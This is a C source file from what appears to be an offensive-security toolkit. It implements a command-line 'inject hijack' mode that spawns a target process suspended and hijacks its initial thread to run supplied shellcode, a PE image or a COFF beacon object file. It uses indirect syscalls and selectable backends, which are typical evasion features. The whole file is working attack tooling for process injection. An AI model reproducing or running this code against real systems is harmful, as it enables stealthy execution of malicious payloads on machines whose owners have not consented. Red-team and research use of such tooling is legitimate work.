#include <sindri.h>
#include <unified/backend.h>
#include <unified/cli.h>
#include <unified/commands.h>
#include <unified/print.h>

static void print_usage(const char *prog) {
    usage_header(prog, "inject", "hijack", "<mode> -f <payload_path> -t <target_image_path> [options]");
    poc_fprintf("\nModes:\n");
    usage_mode("shell", "Inject raw shellcode");
    usage_mode("pe", "Inject PE (DLL or EXE)");
    usage_mode("coff", "Inject COFF (.obj)");
    poc_fprintf("\nOptions:\n");
    usage_opt("-f", "<path>", "Path to the payload.");
    usage_opt("-t", "<path>", "Path to the executable to spawn as the target.");
    usage_opt("-e", "<name>", "[COFF] Name of the entry point function (default: 'go').");
    usage_opt("-a", "<args>", "[COFF] Arguments string to pass to the BOF.");
    usage_backend_flags();
    usage_syscall_flags();
    poc_fprintf("\nDefaults: --nt backend, indirect invoker, scan resolver with sort fallback, syscall cache off.\n");
    poc_fprintf("\nThe target is spawned suspended and its initial thread's context is hijacked:\n"
                "  get context -> rewrite RIP/RSP -> set context -> resume.\n");
}

int cmd_inject_hijack(int argc, char *argv[], const char *prog) {
    if (argc < 1) {
        print_usage(prog);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    const char *mode = argv[0];
    if (poc_strcmp(mode, "-h") == 0 || poc_strcmp(mode, "--help") == 0) {
        print_usage(prog);
        return SND_SUCCESS;
    }

    const char     *file_path = NULL, *entry_name = "go";
    wchar_t         wide_target_path[SND_MAX_PATH];
    const wchar_t  *target_image_path = NULL;
    char           *bof_args          = NULL;
    int             bof_arg_len       = 0;
    api_backend_t   backend           = API_NT;
    syscall_style_t scfg              = {.invoke = INVOKE_INDIRECT, .resolve_scan = 0, .resolve_sort = 0};

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (poc_strcmp(a, "-f") == 0) {
            if (require_arg(argc, i, "-f")) {
                print_usage(prog);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            file_path = argv[++i];
            continue;
        }
        if (poc_strcmp(a, "-t") == 0) {
            if (require_arg(argc, i, "-t")) {
                print_usage(prog);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            snd_ascii_to_wide(wide_target_path, SND_MAX_PATH, argv[++i], SND_MAX_PATH - 1);
            target_image_path = wide_target_path;
            continue;
        }
        if (poc_strcmp(a, "-e") == 0) {
            if (require_arg(argc, i, "-e")) {
                print_usage(prog);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            entry_name = argv[++i];
            continue;
        }
        if (poc_strcmp(a, "-a") == 0) {
            snd_status_t parse_status = parse_bof_arg(argc, argv, &i, &bof_args, &bof_arg_len);
            if (SND_FAILED(parse_status)) {
                print_usage(prog);
                return parse_status.code;
            }
            continue;
        }
        if (!parse_backend(argc, argv, &i, &backend))
            continue;
        if (!parse_syscall_style(argc, argv, &i, &scfg))
            continue;

        log_err("Unknown argument: %s", a);
        print_usage(prog);
        return SND_STATUS_INVALID_COMMAND_LINE_ARG;
    }

    if (!file_path || !target_image_path) {
        log_err("Both -f and -t are required.");
        print_usage(prog);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    snd_status_t       st       = SND_OK;
    snd_buffer_t       file_buf = {0};
    snd_ldr_pe_ctx_t   ldr_pe   = {0};
    snd_ldr_coff_ctx_t ldr_coff = {0};
    snd_inj_ctx_t      inj      = {0};
    unified_backend_t  be       = {0};

    st = unified_backend_init(backend, &scfg, &be);
    if (SND_FAILED(st))
        goto cleanup;

    log_ok("%s backend active.", unified_backend_name(backend));

    /* Return home: ntdll maps at the same base in the same-arch child. */
    FARPROC exit_user_thread = NULL;
    snd_ntdll_get_active_export(SND_HASH_RTLEXITUSERTHREAD, &exit_user_thread);
    if (exit_user_thread) {
        log_info("Return thunk: RtlExitUserThread @ 0x%p", (void *)exit_user_thread);
    } else {
        log_err("Could not resolve RtlExitUserThread; payloads that return will crash.");
    }

    log_info("Loading payload: %s", file_path);
    st = unified_file_load(&be, file_path, &file_buf);
    if (SND_FAILED(st))
        goto cleanup;

    inj.target_image_path = target_image_path;
    inj.proc_api          = be.proc_api;
    inj.thread_api        = be.thread_api;

    if (poc_strcmp(mode, "shell") == 0) {
        inj.payload = &file_buf;
        log_info("Firing thread-hijack shellcode chain...");
        st = snd_inj_hijack_shell(&inj, (PVOID)exit_user_thread);
    } else if (poc_strcmp(mode, "pe") == 0) {
        ldr_pe.mem_api    = be.mem_api;
        ldr_pe.mod_api    = be.mod_api;
        ldr_pe.raw_source = &file_buf;
        log_info("Firing thread-hijack PE chain...");
        st = snd_inj_hijack_pe(&ldr_pe, &inj, (PVOID)exit_user_thread);
    } else if (poc_strcmp(mode, "coff") == 0) {
        ldr_coff.mem_api    = be.mem_api;
        ldr_coff.mod_api    = be.mod_api;
        ldr_coff.raw_source = &file_buf;
        log_info("Firing thread-hijack COFF chain...");
        st = snd_inj_hijack_coff(&ldr_coff, &inj, (PVOID)exit_user_thread, entry_name, bof_args, bof_arg_len);
    } else {
        log_err("Unknown mode: %s. Use shell, pe, or coff.", mode);
        st = SND_ERR(SND_STATUS_INVALID_COMMAND_LINE_ARG);
    }

    if (SND_SUCCEEDED(st))
        log_ok("Hijack chain completed successfully!");

cleanup:
    snd_inj_cleanup(&inj);
    snd_ldr_pe_free_mapped_image(&ldr_pe);
    snd_ldr_coff_free_mapped_image(&ldr_coff);
    snd_buffer_free(&file_buf);

    if (SND_FAILED(st)) {
        snd_status_print(st);
        return st.code;
    }
    return SND_SUCCESS;
}